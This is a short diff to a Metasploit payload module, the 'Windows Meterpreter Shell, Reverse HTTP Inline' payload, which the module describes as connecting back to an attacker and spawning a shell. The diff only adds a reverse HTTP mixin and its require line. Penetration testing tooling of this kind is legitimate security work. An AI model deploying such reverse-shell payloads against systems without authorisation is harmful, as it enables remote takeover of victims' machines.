@@ -6,6 +6,8 @@
 require 'msf/core/payload/transport_config'
 require 'msf/core/handler/reverse_http'
 require 'msf/core/payload/windows/meterpreter_loader'
+require 'msf/core/payload/windows/reverse_http'
+
 require 'msf/base/sessions/meterpreter_x86_win'
 require 'msf/base/sessions/meterpreter_options'
 require 'rex/payloads/meterpreter/config'
@@ -19,9 +21,9 @@ module MetasploitModule
   include Msf::Payload::Single
   include Msf::Payload::Windows::MeterpreterLoader
   include Msf::Sessions::MeterpreterOptions
+  include Msf::Payload::Windows::ReverseHttp
 
   def initialize(info = {})
-
     super(merge_info(info,
       'Name'        => 'Windows Meterpreter Shell, Reverse HTTP Inline',
       'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
